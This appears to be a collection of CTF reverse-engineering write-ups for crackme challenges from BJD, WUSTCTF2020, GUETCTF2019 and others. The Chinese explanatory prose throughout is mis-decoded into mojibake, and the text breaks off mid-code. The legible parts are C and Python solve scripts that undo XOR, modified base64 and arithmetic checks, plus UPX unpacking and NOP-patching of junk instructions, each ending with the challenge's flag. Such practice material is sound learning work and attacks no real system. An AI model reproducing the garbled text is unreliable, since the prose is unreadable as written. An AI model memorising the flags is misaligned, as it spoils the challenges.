ä¸flagæ²¡æœ‰ä»»ä½•å…³ç³»ï¼Œå°±æ˜¯ä¸€ä¸ªçŒœæµ‹éšæœºæ•°çš„æ¸¸æˆ\näºæ˜¯çŒœæµ‹flagéšè—åœ¨å­—ç¬¦ä¸²å¸¸é‡ä¸­\nè¿›å…¥å­—ç¬¦ä¸²å¸¸é‡æœ€é¡¶éƒ¨ï¼Œå‘ç°å¦‚ä¸‹å­—ç¬¦ä¸²ï¼š\nBJD{S1mple_ReV3r5e_W1th_0D_0r_IDA}\nå³ä¸ºflag\nhelloword ä¸‹è½½åå‘ç°æ˜¯apkæ–‡ä»¶\né¦–å…ˆå°†apkåç¼€æ›´æ”¹ä¸ºzip\nè§£å‹åå‘ç°æ–‡ä»¶å¤¹ä¸­å«æœ‰ä¸€ä¸ªclasses.dexæ–‡ä»¶\nä½¿ç”¨dex2jarè½¯ä»¶å°†å…¶è½¬æ¢ä¸ºjaræ–‡ä»¶\nä½¿ç”¨jd-gui.jarå¯¹å…¶è¿›è¡Œé€†å‘åˆ†æ\nåœ¨æºä»£ç ä¸­æœ‰com.example.hellowordæ–‡ä»¶å¤¹ï¼Œç”¨è¿‡Javaçš„éƒ½çŸ¥é“com.exampleæ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œå› æ­¤è¿›å…¥è¯¥ç›®å½•ä¸‹ï¼Œå‘ç°æœ‰ä¸ªMainActivity.classæ–‡ä»¶ï¼ŒæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°æœ‰ä¸ªflagå­—ç¬¦ä¸²å¹¶å¯¹å…¶ä½¿ç”¨äº†ä¸€ä¸ªæ¯”è¾ƒæ–¹æ³•(compareTo)ï¼ŒçŒœæµ‹è¿™ä¸ªå°±æ˜¯éœ€è¦çš„flagï¼Œæäº¤åå‘ç°æ­£ç¡®\nxor æ‹–å…¥idaè¿›è¡Œé™æ€åˆ†æï¼Œå‘ç°å¯¹è¾“å…¥è¿›è¡Œäº†å¼‚æˆ–å¤„ç†ï¼Œå¤„ç†ç»“æœç¬¦åˆæŸä¸ªç‰¹å®šçš„å‡½æ•°å€¼å³å¯æ±‚è§£\nçœ‹åˆ°ä¸€ä¸ªforå¾ªç¯ï¼Œæ˜¯å¯¹æ¯ä¸ªå­—ç¬¦ä¸å‰é¢ä¸€ä¸ªå­—ç¬¦è¿›è¡Œå¼‚æˆ–\næ ¹æ®å¼‚æˆ–çš„æ€§è´¨å¯çŸ¥ï¼Œåªéœ€è¦å†å¼‚æˆ–ä¸€æ¬¡å°±èƒ½è¿˜åŸ\næ‰€ä»¥ä»åå¾€å‰è¿›è¡Œå¼‚æˆ–\néšä¾¿å†™ä¸ªè„šæœ¬è®¡ç®—ä¸€ä¸‹ï¼š\n#include \u0026lt;stdio.h\u0026gt; int main(){ char flag[35]; flag[0] = \u0026#39;f\u0026#39;; flag[1] = \u0026#39;\\n\u0026#39;; flag[2] = \u0026#39;k\u0026#39;; flag[3] = \u0026#39;\\f\u0026#39;; flag[4] = \u0026#39;w\u0026#39;; flag[5] = \u0026#39;\u0026amp;\u0026#39;; flag[6] = \u0026#39;O\u0026#39;; flag[7] = \u0026#39;.\u0026#39;; flag[8] = \u0026#39;@\u0026#39;; flag[9] = \u0026#39;\\x11\u0026#39;; flag[10] = \u0026#39;x\u0026#39;; flag[11] = \u0026#39;\\r\u0026#39;; flag[12] = \u0026#39;Z\u0026#39;; flag[13] = \u0026#39;;\u0026#39;; flag[14] = \u0026#39;U\u0026#39;; flag[15] = \u0026#39;\\x11\u0026#39;; flag[16] = \u0026#39;p\u0026#39;; flag[17] = \u0026#39;\\x19\u0026#39;; flag[18] = \u0026#39;F\u0026#39;; flag[19] = \u0026#39;\\x1F\u0026#39;; flag[20] = \u0026#39;v\u0026#39;; flag[21] = \u0026#39;\u0026#34;\u0026#39;; flag[22] = \u0026#39;M\u0026#39;; flag[23] = \u0026#39;#\u0026#39;; flag[24] = \u0026#39;D\u0026#39;; flag[25] = \u0026#39;\\x0E\u0026#39;; flag[26] = \u0026#39;g\u0026#39;; flag[27] = 6; flag[28] = \u0026#39;h\u0026#39;; flag[29] = \u0026#39;\\x0F\u0026#39;; flag[30] = \u0026#39;G\u0026#39;; flag[31] = \u0026#39;2\u0026#39;; flag[32] = \u0026#39;O\u0026#39;; flag[33] = 0; for (int i = 32; i \u0026gt;= 1; --i) { flag[i] ^= flag[i - 1]; } printf(\u0026#34;%s\u0026#34;, flag); return 0; } // flag{QianQiuWanDai_YiTongJiangHu} reverse3 è¿›è¡Œåˆæ­¥æ£€æŸ¥åæ‹–å…¥idaè¿›è¡Œé™æ€åˆ†æ\nå‘ç°å¯¹äºè¾“å…¥å†…å®¹ä½¿ç”¨äº†ä¸€ä¸ªå‡½æ•°è¿›è¡Œå˜æ¢\næŸ¥çœ‹å­—ç¬¦ä¸²å‘ç°ä½¿ç”¨äº†ä¸€ä¸ª\u0026quot;ABCD\u0026hellip;+/=\u0026ldquo;çš„å­—ç¬¦ä¸²ï¼ŒçŒœæµ‹ä½¿ç”¨äº†BASE64ç¼–ç \nå›åˆ°ä¸»å‡½æ•°ï¼Œå‘ç°ä½¿ç”¨äº†ä¸€ä¸ªstr2ä¸base64åçš„ç»“æœè¿›è¡Œæ¯”è¾ƒ\næŸ¥çœ‹å­—ç¬¦ä¸²å¯çŸ¥ï¼šstr2=e3nifIH9b_C@n@dH\næ˜æ˜¾ä¸æ˜¯base64çš„ç»“æœ\nå›åˆ°ä¸»å‡½æ•°å‘ç°å¯¹base64ç»“æœè¿›è¡Œäº†åŠ æ³•æ“ä½œ\nç¼–ç¨‹è¿›è¡Œåå‘æ“ä½œåå¾—åˆ°ï¼še2lfbDB2ZV95b3V9\nä½¿ç”¨åœ¨çº¿å·¥å…·å¯å¾—è§£ç ç»“æœï¼š{i_l0ve_you}\nå¥—ä¸Šflagæäº¤ï¼Œé€šè¿‡\nä¸ä¸€æ ·çš„flag é¦–å…ˆæµ‹è¯•ä¸€ä¸‹è½¯ä»¶\nå‘ç°å¥½åƒæ˜¯ä¸ªå‰è¿›åé€€çš„æ¸¸æˆ\nçŒœæµ‹æ˜¯ä¸€ä¸ªè¿·å®«\nè¿›å…¥idaé™æ€åˆ†æ\nå‘ç°å½“v8[x]==35æ—¶ä¸ºæˆåŠŸv8[x]==49æ—¶å¤±è´¥\næŸ¥é˜…ASCIIå‘ç°35å¯¹åº”#ï¼Œ49å¯¹åº”1å› æ­¤æŸ¥æ‰¾åŒæ—¶å«æœ‰è¿™ä¸¤ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²ï¼š\n*11110100001010000101111#\næ€»é•¿åº¦ä¸º24ï¼Œä¸5*v4+v5çš„æœ€å¤§å€¼ä¸€è‡´ï¼Œå› æ­¤å¿½ç•¥-41\nè¦æ±‚æ˜¯ä¸èƒ½è¿›å…¥1çš„ä½ç½®è€Œåˆ°è¾¾#\nå› æ­¤è¿›è¡Œç®€å•çš„æ¨å¯¼å³å¯å¾—åˆ°è¦æ±‚çš„åºåˆ—ï¼ˆå®Œå…¨å¯ä»¥å†™ä¸ªä»£ç è·‘ä¸€ä¸‹ï¼Œä½†ç”±äºè¿™ä¸ªé¢˜æ¯”è¾ƒç®€å•ï¼Œç›´æ¥æ‰‹ç®—å³å¯ï¼‰\nå¾—åˆ°è¾“å…¥åºåˆ—ï¼š222441144222\nå¥—ä¸Šflagæäº¤å³å¯\næ³¨ï¼šæ­¤é¢˜å¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ª5*5çš„è¿·å®«ï¼š\n* 1 1 1 1 0 1 0 0 0 0 1 0 1 0 0 0 0 1 0 1 1 1 1 # 1æ˜¯éšœç¢ï¼Œ0æ˜¯å¯ä»¥èµ°çš„è·¯ï¼Œ*æ˜¯èµ·ç‚¹ï¼Œ#æ˜¯é‡ç‚¹\nè¿™æ ·å°±ä¸è¿è¡Œç¨‹åºæ—¶çš„ up, down, left, right å¯¹åº”ä¸Šäº†\nSimpleRev æ‹–å…¥ida\nå‘ç°è¿™é“é¢˜æ¶‰åŠåˆ°ç±»å‹è½¬æ¢ï¼Œéœ€è¦å°†intè½¬æ¢ä¸ºcharæ’å…¥åˆ°å­—ç¬¦ä¸²åé¢\néœ€è¦æ³¨æ„çš„æ˜¯åœ¨è½¬æ¢æ—¶è¦æŠŠé¡ºåºå€’è¿‡æ¥\nè½¬æ¢åtextä¸ºkillshadowï¼Œkeyä¸ºADSFKNDCLS\néšåå°†keyè½¬æ¢ä¸ºå°å†™å­—æ¯ï¼Œå³adsfkndcls\nç¼–ç¨‹æšä¸¾æ±‚è§£\nint main{ char text[25]; strcpy(text, \u0026#34;killshadow\u0026#34;); char key[25]; strcpy(key, \u0026#34;adsfkndcls\u0026#34;); char str2[25]; int textlen = strlen(text); for (int i = 0; i \u0026lt; textlen; ++i) { for (char c = \u0026#39;A\u0026#39;; c \u0026lt;= \u0026#39;z\u0026#39;; ++c) { if (c \u0026lt;= 96 || c \u0026gt; 122) { if (c \u0026gt; 64 \u0026amp;\u0026amp; c \u0026lt;= 90) { if(text[i] == (c - 39 - key[i] + 97) % 26 + 97) { printf(\u0026#34;%d%c \u0026#34;, i, c); } } } else { if(text[i] == (c - 39 - key[i] + 97) % 26 + 97) { printf(\u0026#34;%d%c \u0026#34;, i, c); } } } } return 0; } æ¯ä¸ªä½ç½®å‡å¯ä»¥ç®—å‡ºä¸¤ä¸ªè§£ï¼Œä¸€ä¸ªæ˜¯å¤§å†™å­—æ¯ï¼Œä¸€ä¸ªæ˜¯å°å†™å­—æ¯\nå…¨éƒ¨æŒ‘é€‰å¤§å†™å­—æ¯åæäº¤ï¼Œå¯ä»¥é€šè¿‡\næƒ³å°è¯•ä¸€ä¸‹å…¶å®ƒç»„åˆæ–¹æ¡ˆæ˜¯å¦ä¹Ÿå¯ä»¥ï¼Œä½†å¯æƒœæäº¤å¹³å°ä¸å…è®¸å¤šæ¬¡æäº¤\nJavaé€†å‘è§£å¯† å°†.classæ–‡ä»¶æ‹–å…¥jd-gui.jarä¸­è¿›è¡Œé€†å‘\nå¯ä»¥å¾—åˆ°Reverse.classæºä»£ç ï¼š\nimport java.util.ArrayList; import java.util.Scanner; public class Reverse { public static void main(String[] args) { Scanner s = new Scanner(System.in); System.out.println(\u0026#34;Please input the flag ); String str = s.next(); System.out.println(\u0026#34;Your input is ); System.out.println(str); char[] stringArr = str.toCharArray(); Encrypt(stringArr); } public static void Encrypt(char[] arr) { ArrayList\u0026lt;Integer\u0026gt; Resultlist = new ArrayList\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; arr.length; i++) { int result = arr[i] + 64 ^ 0x20; Resultlist.add(Integer.valueOf(result)); } int[] KEY = { 180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65 }; ArrayList\u0026lt;Integer\u0026gt; KEYList = new ArrayList\u0026lt;\u0026gt;(); for (int j = 0; j \u0026lt; KEY.length; j++) KEYList.add(Integer.valueOf(KEY[j])); System.out.println(\u0026#34;Result:\u0026#34;); if (Resultlist.equals(KEYList)) { System.out.println(\u0026#34;Congratulations); } else { System.err.println(\u0026#34;Error); } } } è¿™æ®µä»£ç å°±æ˜¯å°†è¾“å…¥çš„æ¯ä¸ªå­—ç¬¦åŠ 64åä¸0x20è¿›è¡Œå¼‚æˆ–\nå› æ­¤ä½¿ç”¨pythonè¿›è¡Œæš´åŠ›ç ´è§£ï¼ˆå…¶å®å®Œå…¨å¯ä»¥åå‘è®¡ç®—å°±å‡ºæ¥çš„ï¼Œå½“æ—¶å¤§æ„äº†ï¼‰\nkey = [180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65] for k in key: for c in range(0x21, 0x80): if (c + 64) ^ 0x20 == k: print chr(c) # This_is_the_flag_! [WUSTCTF2020]Crossfun æ‹–å…¥idaï¼Œå‘ç°æœ‰ä¸ªåˆ¤æ–­å‡½æ•°ï¼Œé‡Œé¢å¯¹è¾“å…¥çš„æ¯ä¸ªå­—ç¬¦è¿›è¡Œäº†åˆ¤æ–­ï¼ŒæŠŠæ‰€æœ‰åˆ¤æ–­å‡½æ•°æ•´åˆèµ·æ¥ï¼Œå°±å¾—åˆ°flagäº†\nflag: wctf2020{cpp_@nd_r3verse_@re_fun}\n[WUSTCTF2020]level1 æ‹–å…¥ida\nstream = fopen(\u0026#34;flag\u0026#34;, \u0026#34;r\u0026#34;); fread(ptr, 1uLL, 0x14uLL, stream); fclose(stream); for ( i = 1; i \u0026lt;= 19; ++i ) { if ( i \u0026amp; 1 ) printf(\u0026#34;%ld\\n\u0026#34;, (unsigned int)(ptr[i] \u0026lt;\u0026lt; i)); else printf(\u0026#34;%ld\\n\u0026#34;, (unsigned int)(i * ptr[i])); } æ˜¾ç„¶ ptr é‡Œé¢å°±æ˜¯flag\nçœ‹åˆ° output.txt é‡Œé¢æ­£å¥½æœ‰19è¡Œ\nå¯¹å…¶è¿›è¡Œé€†å˜æ¢ï¼ˆæ³¨æ„0ï¼‰\nptr = [0, 198, 232, 816, 200, 1536, 300, 6144, 984, 51200, 570, 92160, 1200, 565248, 756, 1474560, 800, 6291456, 1782, 65536000] flag = \u0026#39;\u0026#39; for i in range(1, 20): if i % 2 == 1: flag += chr(ptr[i] \u0026gt;\u0026gt; i) else: flag += chr(ptr[i] // i) print (flag) å¾—åˆ°flag ctf2020{d9-dE6-20c}\n[WUSTCTF2020]level2 å…ˆä½¿ç”¨upxè¿›è¡Œè„±å£³\nupx -d attachment è¿›å…¥mainå‡½æ•°\nè¿˜æ²¡æ¥å¾—åŠæŒ‰ tab å‰å°±çœ‹åˆ°äº†flag\n; __unwind { lea ecx, [esp+4] and esp, 0FFFFFFF0h push dword ptr [ecx-4] push ebp mov ebp, esp push ecx sub esp, 14h mov [ebp+var_C], offset flag ; \u0026#34;wctf2020{Just_upx_-d}\u0026#34; sub esp, 0Ch push offset aWhereIsIt ; \u0026#34;where is it?\u0026#34; call puts add esp, 10h mov eax, 0 mov ecx, [ebp+var_4] leave lea esp, [ecx-4] retn ; } // starts at 804887C è¿™ä»¶äº‹æƒ…å‘Šè¯‰æˆ‘ä»¬è¿˜æ˜¯è¦çœ‹æ±‡ç¼–ä»£ç çš„\nflag{Just_upx_-d}\n[WUSTCTF2020]level3 é¦–å…ˆå°è¯•è¿è¡Œç¨‹åºï¼Œå‘ç°æ˜¯ä¸€ä¸ªbase64ç¼–ç ç¨‹åº\nè¿›è¡Œæµ‹è¯•åçœ‹åˆ°ç¨‹åºä¸­è¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸² Is there something wrong?\næ¨æµ‹è¿™ä¸ªbase64å¯èƒ½ä¸æ­£ç¡®\nä½¿ç”¨åœ¨çº¿å·¥å…·æµ‹è¯•åå‘ç°å¤§å†™å­—æ¯å‡ºç°é”™è¯¯\næŸ¥çœ‹base64_tableå­—ç¬¦ä¸²ï¼Œå‘ç°æ²¡æœ‰é—®é¢˜ï¼Œè¯´æ˜æºä»£ç ä¸­æœ‰å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ“ä½œçš„éƒ¨åˆ†\næŸ¥çœ‹æºä»£ç ï¼Œå‘ç°ä¸€ä¸ªå‡½æ•°æ˜¯ O_OLootAtYou\nfor ( i = 0; i \u0026lt;= 9; ++i ) { v0 = base64_table[i]; base64_table[i] = base64_table[19 - i]; result = 19 - i; base64_table[result] = v0; } ä¸»å‡½æ•°ä¸­è¯´æœ‰ä¸€ä¸ªå¥‡æ€ªçš„å­—ç¬¦ä¸²ï¼Œæ˜¾ç„¶æ˜¯ç”¨é”™è¯¯çš„åŠ å¯†å¾—åˆ°çš„ç»“æœ\nå¯¹å…¶è¿›è¡Œæ›´æ­£åè§£å¯†\nimport base64 str = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34; table = [] for c in str: table.append(c) for i in range(10): c = table[i] table[i] = table[19 - i] table[19 - i] = c crypto = \u0026#34;d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==\u0026#34; msg = \u0026#34;\u0026#34; for i in range(len(crypto)): if ord(crypto[i]) \u0026gt;= ord(\u0026#39;A\u0026#39;) and ord(crypto[i]) \u0026lt;= ord(\u0026#39;Z\u0026#39;): for j in range(26): if table[j] == crypto[i]: msg += chr(j + ord(\u0026#39;A\u0026#39;)) else: msg += crypto[i] print (msg) print (base64.b64decode(msg)) è¿è¡Œå¾—åˆ°flagä¸º wctf2020{Base64_is_the_start_of_reverse}\n[WUSTCTF2020]level4 è¿è¡Œä¸€ä¸‹ç¨‹åºï¼Œå‘ç°è¿™é“é¢˜å’Œç»“æ„ä½“æœ‰å…³\næ‹–å…¥ida\nçœ‹åˆ°ä¸»å‡½æ•°ä¸­è¾“å‡ºçš„æ˜¯type1å’Œtype2å‡½æ•°çš„ç»“æœ\næŸ¥çœ‹type1å’Œtype2\nif ( a1 ) { type1(*((_QWORD *)a1 + 1)); putchar(*a1); result = type1(*((_QWORD *)a1 + 2)); } if ( a1 ) { type2(*((_QWORD *)a1 + 1)); type2(*((_QWORD *)a1 + 2)); result = putchar(*a1); } æ˜æ˜¾æ˜¯äºŒå‰æ ‘çš„ä¸­åºéå†å’Œååºéå†\nåæ¨å‡ºå‰åºéå†ï¼Œå¾—åˆ°flag: wctf2020{This_IS_A_7reE}\n[WUSTCTF2020]funnyre æ‹–å…¥idaåï¼Œé€šè¿‡startå‡½æ•°è¿›å…¥main\nå‘ç°mainå‡½æ•°æœªå®šä¹‰ï¼ŒæŒ‰påˆ›å»ºå‡½æ•°åF5ï¼ŒæŸ¥çœ‹ä»£ç \nçœ‹åˆ°ä¸€ä¸²å¦‚ä¸‹ä»£ç ï¼š\nv7 = 0LL; do *(_BYTE *)(v6 + v7++ + 5) ^= 0x91u; // æ¯ä¸€é¡¹å¼‚æˆ–0x91 while ( v7 != 32 ); é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€äº›é”™è¯¯ä»£ç æ ‡çº¢\nä»¥åŠJUMPOUTå‡½æ•°\nä¾‹å¦‚ï¼š\nJUMPOUT(1, (char *)\u0026amp;loc_400B81 + 1); JUMPOUT(0, (char *)\u0026amp;loc_400B81 + 1); v89 = MEMORY[0xFFFFFFFF81003D16](v6); JUMPOUT(v91, (char *)\u0026amp;loc_400B88 + 2); *(_DWORD *)((unsigned int)(v89 - 1065138106) - 125LL) += v92; *(_BYTE *)(a3 - 15) \u0026amp;= BYTE1(v90); ç»è¿‡å­¦ä¹ åå‘ç°JUMPOUTå‡½æ•°æ˜¯ç»å…¸èŠ±æŒ‡ä»¤ï¼Œéœ€è¦patchå»é™¤\n.text:0000000000400607 loc_400607: ; CODE XREF: main+64â†“j .text:0000000000400607 xor byte ptr [rdx+rax+5], 91h .text:000000000040060C add rax, 1 .text:0000000000400610 cmp rax, 20h .text:0000000000400614 jnz short loc_400607 .text:0000000000400616 jz short near ptr loc_40061A+1 .text:0000000000400618 jnz short near ptr loc_40061A+1 .text:000000000040061A .text:000000000040061A loc_40061A: ; CODE XREF: main+66â†‘j .text:000000000040061A ; main+68â†‘j .text:000000000040061A call near ptr 0FFFFFFFF810037AFh .text:000000000040061F jz short near ptr loc_400621+2 .text:0000000000400621 å‘ç°40061Aè¿™ä¸ªä½ç½®å…¶å®è¢«è·³è¿‡äº†\nå°†è¿™ä¸ªä½ç½®çš„æ•°æ®å˜ä¸º90ï¼ˆå³nopï¼‰\næŒ‰cå°†å…¶è½¬æ¢å›æ±‡ç¼–ä»£ç \nå¾—åˆ°æ­£ç¡®ä»£ç \n.text:0000000000400616 jz short loc_40061B .text:0000000000400618 jnz short loc_40061B .text:000000000040061A nop .text:000000000040061B .text:000000000040061B loc_40061B: ; CODE XREF: main+66â†‘j .text:000000000040061B ; main+68â†‘j .text:000000000040061B nop .text:000000000040061C xor eax, eax .text:000000000040061E .text:000000000040061E loc_40061E: ; CODE XREF: main+7Bâ†“j .text:000000000040061E xor byte ptr [rdx+rax+5], 0CDh .text:0000000000400623 add rax, 1 .text:0000000000400627 cmp rax, 20h .text:000000000040062B jnz short loc_40061E .text:000000000040062D xor eax, eax .text:000000000040062F åœ¨idaæ±‡ç¼–æ¨¡å¼ä¸­å°†åé¢å‡ ä¸ªæ ‡çº¢çš„éƒ¨åˆ†è¿›è¡ŒåŒæ ·çš„ä¿®æ”¹ï¼Œéšåå†F5å³å¯æŸ¥çœ‹åˆ°æ­£ç¡®çš„ä»£ç \næ‰¾åˆ°å‡½æ•°ç»“å°¾\nif ( memcmp(v5 + 5, \u0026amp;unk_4025C0, 0x20uLL) ) JUMPOUT(\u0026amp;loc_4005BB); å‘ç°unkå­—ç¬¦ä¸²ï¼Œå°†å…¶è¿›è¡Œå¦‚ä¸Šå‡½æ•°çš„é€†å˜æ¢ï¼Œå³å¯å¾—åˆ°æœ€ç»ˆç»“æœ\næˆ‘é€‰æ‹©çš„æ–¹æ³•æ˜¯å¤åˆ¶åˆ°vscodeç„¶ååˆ©ç”¨å¿«æ·é”®è¿›è¡Œå¿«é€Ÿå¤åˆ¶ï¼Œæœ€ç»ˆå¾—åˆ°ç­”æ¡ˆ\nä»£ç å¦‚ä¸‹ï¼š\nres = [0xD9, 0x2C, 0x27, 0xD6, 0xD8, 0x2A, 0xDA, 0x2D, 0xD7, 0x2C, 0xDC, 0xE1, 0xDB, 0x2C, 0xD9, 0xDD, 0x27, 0x2D, 0x2A, 0xDC, 0xDB, 0x2C, 0xE1, 0x29, 0xDA, 0xDA, 0x2C, 0xDA, 0x2A, 0xD9, 0x29, 0x2A] add = [80, 64, 79, 30, 91, 9, 5, 99, 87, 83, 59, 58, 1, 90, 57, 65, 53, 41, 85, 89, 44, 70, 12, 84, 10, 74, 17, 38, 43, 33, 11, 94, 86, 55, 32, 97, 68, 50, 67, 71, 96, 56, 6, 73, 52, 42, 61, 69, 14, 75, 4, 40, 37, 15, 77, 2, 23, 62, 29, 49, 47, 27, 66, 82, 46, 19, 88, 63, 39, 35, 25, 51, 18, 92, 95, 3, 72, 48, 36, 93, 76, 22, 98, 81, 13, 45, 34, 78, 26, 54, 28, 31, 20, 16, 7, 24, 60, 21, 8] xor1 = [0xF9, 0xA9, 0x4E, 0xD3, 0xC7, 0xE2, 0xD2, 0x33, 0xA8, 0x96, 0xBD, 0xC, 0x13, 0x2F, 0x73, 0x65, 0x9C, 0x12, 2, 0x32, 0x10, 0x84, 0xED, 0x95, 0x4D, 0x75, 0x2C, 0x5D, 0x39, 0x18, 0x4C, 0x49, 0x37, 0xF0, 0x99, 0x41, 0x86, 0x76, 0xF5, 5, 0xC8, 0x64, 0xFA, 0x50, 0x3B, 8, 0xE9, 0x23, 0xC3, 0x68, 0x67, 0xff, 0x7D, 0x9D, 0x1D, 0xDA, 0xD8, 0xEB, 0xF6, 0xE3, 0x98, 0xE1, 0x34, 0x82, 0x7F, 0xD5, 0xE7, 0xB8, 0xDC, 0x97, 0xA3, 7, 0xB6, 0xB, 0x14, 0xCE, 0x66, 0x62, 0xEF] # ä¸­é—´æœ‰ä¸€ä¸ª0xffï¼Œå¯¹åº”è¿™å–åçš„é‚£ä¸ªå¾ªç¯ for i in range(len(res)): for j in add: res[i] -= j res[i] %= 256 for i in range(len(res)): for j in xor1: res[i] ^= j for i in range(len(res)): res[i] += 128 res[i] %= 256 xor2 = [0x91, 0xCD, 0x6A, 0x59, 0xA, 0xF3, 0xCA, 0x3E, 0x6C, 0x4F, 0x24, 0x83, 0xC4, 0x53, 4, 0x9E, 0x42, 0xE, 0x8D, 0x38, 0x7A, 0xDD, 0x52, 0x1B, 0xAA, 0xAE, 0xF8, 0x58, 0xF2, 0x9F, 0x3C, 0xA1, 6, 0x78, 0x70, 0x28, 0xEA, 0x48, 0xE4, 0x6E, 0x40, 0x89, 0x16, 0xD7, 0xB5, 0xD, 0x17, 0x5A, 0xB1, 0x69, 0x5C, 0x21, 0xE5, 0x7E, 0x2A, 0x94, 0xBC, 1, 0x74, 0x57, 0x6D, 0x1E, 0xA2, 0x6B, 0x22, 0xC2, 0x3D, 0x44, 0x90, 0x8C, 0xB3, 0xA6, 0x79, 0x61, 0xD9, 0x5B, 0x1A, 0x43, 0x8F, 0xA5, 0xEE, 0x25, 0x46, 0xE6, 0x88, 0x20, 0x71, 0xE8, 9, 0x8A, 0x7B, 0xB4, 0x19, 0x15, 0x4A, 0x47, 0xDB, 0x72, 0x5F, 0x26, 0xA7, 0x8B, 0xBA, 0xBF, 0x87, 0x36, 0x3F, 0xFE, 0x77, 0x1C, 0x81, 0x11, 0x2E, 0x7C, 0x63, 0x45, 0xF4, 0x56, 0xF1, 0xB0, 0xD1, 0xE0, 0xF, 0x93, 0xD6, 0x1F, 0xCC, 0x4B, 0xCF, 0xDF, 0x55, 0xB9, 0x2B, 0x85, 0x31, 0x29, 0xFD, 0x3A, 0x5E, 0xDE, 3, 0xC6, 0xC1, 0xC5, 0x54, 0xBB, 0xFC, 0xBE, 0xEC, 0xC0, 0xAD, 0xA4, 0xD0, 0x35, 0xB7, 0x51, 0xAB, 0x2D, 0xAF, 0x92, 0x60, 0xAC, 0x30, 0xD4, 0xCB, 0x9B, 0x9A, 0xFB, 0x6F, 0xF7, 0x8E, 0xA0, 0x27, 0xC9] for i in range(len(res)): for j in xor2: res[i] ^= j print(chr(res[i]), end=\u0026#39;\u0026#39;) print () å¾—åˆ° flag: 1dc20f6e3d497d15cef47d9a66d6f1af\n[GUETCTF2019]re å…ˆupxè„±å£³\nç„¶åæ‹–å…¥ida\næ‰¾åˆ°å…³é”®å­—ç¬¦ä¸²\nè¿›å…¥å‡½æ•°\nå‘ç°æ˜¯å¯¹æ¯ä¸€ä½è¿›è¡Œä¹˜æ³•ç„¶ååˆ¤æ–­\nç›´æ¥æ‰”åˆ°pythoné‡Œç®—ä¸€ä¸‹ï¼Œå‘ç° a[6] ç¼ºå¤±ï¼Œä»¥åŠæœ‰ä¸€ä½ç®—ä¸å‡ºæ¥ï¼Œå¯èƒ½å‡ºç°äº†æº¢å‡º\nç”¨cè¯­è¨€æŠŠè¿™ä¸€ä½ç®—å‡ºæ¥ï¼Œå¾—åˆ°æ˜¯ a\nå¯¹ç¬¬7ä½è¿›è¡Œæš´åŠ›ç ´è§£ï¼Œå‘ç°1å¯ä»¥ï¼Œå¾—åˆ°flag\nx = [ 1629056, 6771600, 3682944, 10431000, 3977328, 5138336, 7532250, 5551632, 3409728, 13013670, 6088797, 7884663, 8944053, 5198490, 4544518, 10115280,3645600, 9667504, 5364450, 13464540, 5488432, 14479500, 6451830, 6252576, 7763364, 7327320, 8741520, 8871876, 4086720, 9374400, 5759124 ] a = [ 166163712 , 731332800 , 357245568 , 1074393000, 489211344 , 518971936 , 406741500 , 294236496 , 177305856 , 650683500, 298351053, 386348487, 438258597, 249527520, 445362764, 981182160, 174988800, 493042704, 257493600, 767478780, 312840624, 140451150, 316139670, 619005024, 372641472, 373693320, 498266640, 452465676, 208422720, 515592000, 719890500 ] for i in range(len(x)): if (a[i] % x[i] == 0): print (chr(a[i] // x[i]), end=\u0026#39;\u0026#39;) else: print (\u0026#39;\\n\u0026#39;, i) print (\u0026#39;\\nfinish\u0026#39;) è¾“å‡ºä¸º\nflag{e65421110ba03099 21 1c039337} finish flag: flag{e165421110ba03099a1c039337}\nå†å†™ä¸ªcæŠŠè¿™ä¸€ä½ç®—ä¸€ä¸‹ï¼ˆå…¶å®ä¸å¦‚ç›´æ¥ç”¨cæš´åŠ›ç ´è§£äº†ï¼‰\n#include \u0026lt;stdio.h\u0026gt; int main(){ char x; for (x = 0x21; x \u0026lt; 0x7f; x++){ if (14479500 * x == 1404511500){ printf(\u0026#34;%c\\n\u0026#34;, x); } } printf(\u0026#34;finish\\n\u0026#34;); return 0; } [GUETCTF2019]number game å…ˆæ‹–å…¥idaè¿›è¡Œé™æ€åˆ†æï¼ŒæŸ¥çœ‹mainå‡½æ•°æ ¸å¿ƒä»£ç \n__isoc99_scanf(\u0026#34;%s\u0026#34;, \u0026amp;v5, a3); if ( (unsigned int)check_input((const char *)\u0026amp;v5) )// é•¿åº¦ä¸º10ä¸”åªèƒ½æ˜¯\u0026#34;01234\u0026#34; { v3 = sub_400758((__int64)\u0026amp;v5, 0, 10); sub_400807((__int64)v3, (__int64)\u0026amp;v7); v9 = 0; sub_400881((char *)\u0026amp;v7); // v7 = \u0026#34;0421421430\u0026#34; if ( (unsigned int)sub_400917() ) { puts(\u0026#34;TQL!\u0026#34;); printf(\u0026#34;flag{\u0026#34;, \u0026amp;v7); printf(\u0026#34;%s\u0026#34;, \u0026amp;v5); puts(\u0026#34;}\u0026#34;); } else { puts(\u0026#34;your are cxk!!\u0026#34;); } } è¾“å…¥çš„å­—ç¬¦ä¸²éœ€è¦é€šè¿‡ä¸¤ä¸ªifè¯­å¥\nå…ˆçœ‹ç¬¬ä¸€ä¸ªifè¯­å¥å¯¹åº”çš„å‡½æ•°\nif ( strlen(a1) == 10 ) { for ( i = 0; i \u0026lt;= 9; ++i ) { if ( a1[i] \u0026gt; 52 || a1[i] \u0026lt;= 47 ) { puts(\u0026#34;Wrong!\u0026#34;); return 0LL; } } result = 1LL; } else { puts(\u0026#34;Wrong!\u0026#34;); result = 0LL; } è¿™æ˜¯å¯¹è¾“å…¥æ•°æ®çš„ç®€å•è¦æ±‚ï¼Œè¦æ±‚æ˜¯10ä¸ª0-4è‡ªæˆçš„å­—ç¬¦ä¸²\nå†æŸ¥çœ‹ç¬¬äºŒä¸ªifä¸­çš„å‡½æ•°\nv1 = 1 for ( i = 0; i \u0026lt;= 4; 